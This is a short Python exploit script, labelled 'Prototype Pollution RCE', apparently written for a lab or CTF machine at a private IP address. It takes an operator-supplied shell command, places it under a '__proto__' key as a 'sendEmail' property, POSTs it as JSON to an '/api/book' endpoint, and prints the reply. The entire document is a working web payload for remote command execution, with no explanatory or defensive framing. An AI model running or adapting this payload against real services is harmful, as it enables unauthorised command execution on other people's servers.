import requests
import argparse
url = "http://172.16.10.77/api/book"

parser = argparse.ArgumentParser(description="Prototype Pollution RCE")
parser.add_argument(
    "-c",
    "--command",
    required=True,
    help="Command to execute target"
)
args = parser.parse_args()
cmd = args.command


#cmd = input("Enter ur command for RCE: ")
obj = {
  "__proto__": {
    "sendEmail": f"{cmd}"
  }
}

x = requests.post(url, json = obj)

print(x.text)
